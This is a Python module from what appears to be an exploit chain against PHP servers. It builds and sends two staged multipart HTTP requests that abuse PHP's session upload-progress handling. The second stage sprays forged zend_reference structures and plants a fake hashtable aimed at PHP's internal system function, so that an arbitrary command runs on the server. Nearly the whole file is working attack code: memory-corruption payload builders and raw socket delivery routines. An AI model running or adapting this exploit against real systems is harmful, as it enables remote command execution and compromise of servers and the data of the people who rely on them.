"""Byte-exact A2 and B2 builders for the prefork-pinned chain."""

from __future__ import annotations

import socket
import time
from dataclasses import dataclass
from typing import Iterator

from core.target import Target
from .carrier import fake_hashtable, store_unsigned, validate_command
from .schema import AbiLayout
from .wire import recv_all


BOUNDARY = b"codex843a2b2"


@dataclass(frozen=True)
class StageExchange:
    request_head: bytes
    body_bytes: int
    response: bytes


def part(disposition: bytes, body: bytes, extra: bytes = b"") -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\nContent-Disposition: " + disposition + b"\r\n"
        + extra + b"\r\n" + body + b"\r\n"
    )


def a2_pieces(parts: int, depth: int, fillers: int) -> Iterator[bytes]:
    if parts < 0 or fillers < 0 or depth < 1:
        raise ValueError("invalid A2 request shape")
    yield part(b'form-data; name="PHPSESSID"', b"\0")
    yield part(b'form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b"a2")
    for index in range(fillers):
        yield part(
            b'form-data; name="' + f"{index:03d}".encode("ascii") + b'"',
            b"x",
        )
    suffix = b"[x]" * depth
    for index in range(parts):
        name = b"u" + str(index).encode("ascii") + suffix
        yield part(b'form-data; name="' + name + b'"; filename=""', b"")
    yield b"--" + BOUNDARY + b"--\r\n"


def _chunk(sock: socket.socket, data: bytes) -> None:
    sock.sendall(f"{len(data):x}\r\n".encode("ascii"))
    sock.sendall(data)
    sock.sendall(b"\r\n")


def _post_head(target: Target, framing: bytes) -> bytes:
    try:
        path = target.path.encode("ascii")
        host = target.host_header.encode("ascii")
    except UnicodeEncodeError as exc:
        raise ValueError("target path and Host header must be ASCII") from exc
    return (
        b"POST " + path + b" HTTP/1.1\r\nHost: " + host + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        + framing
        + b"Connection: close\r\n\r\n"
    )


def send_a2(
    target: Target,
    *,
    parts: int,
    depth: int,
    fillers: int,
) -> StageExchange:
    """Send A2 with chunked framing and return transport evidence."""
    if target.scheme != "http":
        raise ValueError("the pinned chain currently requires direct HTTP")
    head = _post_head(target, b"Transfer-Encoding: chunked\r\n")
    sock = socket.create_connection(
        (target.connect_host, target.port), timeout=target.timeout,
    )
    sock.settimeout(target.timeout)
    body_bytes = 0
    try:
        sock.sendall(head)
        try:
            for piece in a2_pieces(parts, depth, fillers):
                _chunk(sock, piece)
                body_bytes += len(piece)
            sock.sendall(b"0\r\n\r\n")
        except OSError:
            pass
        return StageExchange(head, body_bytes, recv_all(sock))
    finally:
        sock.close()


def fake_reference(
    target_address: int,
    value_length: int,
    refcount: int,
    *,
    abi: AbiLayout,
    start: int | None = None,
) -> bytes:
    """Repeat the calibrated ``zend_reference`` throughout a form value."""
    if value_length < 1 or refcount < 0:
        raise ValueError("invalid B2 reference shape")
    start = abi.reference_start if start is None else start
    one = bytearray(abi.reference_size)
    store_unsigned(
        one, abi.reference_gc_refcount_offset, refcount, 4, abi.byte_order,
    )
    store_unsigned(
        one, abi.reference_gc_type_offset, abi.reference_gc_type, 1, abi.byte_order,
    )
    store_unsigned(
        one, abi.reference_target_offset, target_address,
        abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        one, abi.reference_zval_type_offset, abi.reference_zval_type,
        4, abi.byte_order,
    )
    value = bytearray(b"S" * value_length)
    for offset in range(
        start,
        value_length - abi.reference_size + 1,
        abi.reference_stride,
    ):
        value[offset:offset + abi.reference_size] = one
    return bytes(value)


def fixed_name(prefix: bytes, index: int, length: int) -> bytes:
    if length < 1:
        raise ValueError("B2 field-name length must be positive")
    value = prefix + f"{index:09d}".encode("ascii")
    return (value + b"x" * length)[:length]


def b2_parts(
    *,
    first_sprays: int,
    second_sprays: int,
    value_length: int,
    target_address: int,
    reference_refcount: int,
    name_length: int,
    hashtable_address: int,
    zif_system: int,
    abi: AbiLayout,
    command: bytes,
) -> tuple[tuple[bytes, ...], bytes]:
    """Build B2 without doing I/O, preserving the proven allocation order."""
    if first_sprays < 0 or second_sprays < 0:
        raise ValueError("B2 spray counts must be non-negative")
    validate_command(command, value_length, abi)
    value = fake_reference(
        target_address,
        value_length,
        reference_refcount,
        abi=abi,
    )
    pieces: list[bytes] = []
    for index in range(first_sprays):
        pieces.append(part(
            b'form-data; name="' + fixed_name(b"s", index, name_length) + b'"',
            value,
        ))
    pieces.append(part(
        b'form-data; name="ht"',
        fake_hashtable(
            hashtable_address,
            zif_system,
            value_length,
            abi=abi,
            command=command,
        ),
    ))
    pieces.extend((
        part(b'form-data; name="PHPSESSID"', b"b2sid"),
        part(b'form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b"b2"),
    ))
    for index in range(second_sprays):
        pieces.append(part(
            b'form-data; name="' + fixed_name(b"t", index, name_length) + b'"',
            value,
        ))
    ending = b"--" + BOUNDARY + b"--\r\n"
    return tuple(pieces), ending


def send_b2(
    target: Target,
    *,
    first_sprays: int,
    second_sprays: int,
    value_length: int,
    target_address: int,
    reference_refcount: int,
    name_length: int,
    hold_seconds: float,
    hashtable_address: int,
    zif_system: int,
    abi: AbiLayout,
    command: bytes,
) -> StageExchange:
    """Send the final fixed-length B2 request with an arbitrary command."""
    if target.scheme != "http":
        raise ValueError("the pinned chain currently requires direct HTTP")
    if hold_seconds < 0:
        raise ValueError("B2 hold time must be non-negative")
    pieces, ending = b2_parts(
        first_sprays=first_sprays,
        second_sprays=second_sprays,
        value_length=value_length,
        target_address=target_address,
        reference_refcount=reference_refcount,
        name_length=name_length,
        hashtable_address=hashtable_address,
        zif_system=zif_system,
        abi=abi,
        command=command,
    )
    body_length = sum(len(piece) for piece in pieces) + len(ending)
    head = _post_head(target, f"Content-Length: {body_length}\r\n".encode("ascii"))
    sock = socket.create_connection(
        (target.connect_host, target.port), timeout=target.timeout,
    )
    sock.settimeout(target.timeout)
    try:
        sock.sendall(head)
        for piece in pieces:
            sock.sendall(piece)
        if hold_seconds:
            time.sleep(hold_seconds)
        try:
            sock.sendall(ending)
        except OSError:
            pass
        return StageExchange(head, body_length, recv_all(sock))
    finally:
        sock.close()


__all__ = (
    "BOUNDARY",
    "StageExchange",
    "a2_pieces",
    "b2_parts",
    "fake_reference",
    "fixed_name",
    "part",
    "send_a2",
    "send_b2",
)
